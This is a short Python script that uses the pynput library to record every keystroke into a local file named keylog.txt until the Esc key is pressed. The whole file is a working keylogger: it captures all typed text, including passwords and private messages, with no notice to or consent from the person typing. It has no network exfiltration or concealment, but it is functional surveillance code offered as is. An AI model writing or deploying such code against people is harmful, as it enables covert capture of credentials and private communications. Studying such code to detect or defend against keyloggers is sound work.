from pynput import keyboard

# Path to the log file
log_file = "keylog.txt"

# Function to write keystrokes to the log file
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Handle special keys
        with open(log_file, "a") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            else:
                f.write(f"[{key.name}]")

# Function to handle key release (optional)
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop the listener
        return False

# Start listening for key presses
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
